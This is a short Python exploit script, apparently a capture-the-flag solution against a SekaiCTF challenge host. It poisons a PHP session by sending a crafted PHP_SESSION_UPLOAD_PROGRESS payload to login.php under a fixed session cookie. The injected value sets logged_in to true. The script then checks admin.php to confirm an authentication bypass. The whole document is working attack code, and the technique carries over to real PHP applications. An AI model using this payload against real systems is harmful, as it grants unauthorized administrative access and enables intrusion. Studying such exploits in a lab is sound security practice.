import requests
import urllib.parse

BASE_URL = "https://admin-panel-489a10b9570c.instancer.sekai.team"
host = urllib.parse.urlparse(BASE_URL).hostname

sess = requests.Session()
sess.cookies.set("PHPSESSID", "osuadminpwnd", domain=host, path="/")

payload = "|b:1;logged_in|b:1;progress"
files = {
    "PHP_SESSION_UPLOAD_PROGRESS": (None, payload),
    "username": (None, "peppy"),
    "password": (None, "anything"),
    "file": ("dummy.txt", "x" * (1024 * 1024), "text/plain"),
}

r1 = sess.post(f"{BASE_URL}/login.php", files=files, allow_redirects=False, timeout=30)
print("Poison status:", r1.status_code)
admin_page = sess.get(f"{BASE_URL}/admin.php", allow_redirects=False, timeout=10)
print("Admin status:", admin_page.status_code, admin_page.headers.get('Location'))
print("Contains system stats?", 'system stats' in admin_page.text.lower())
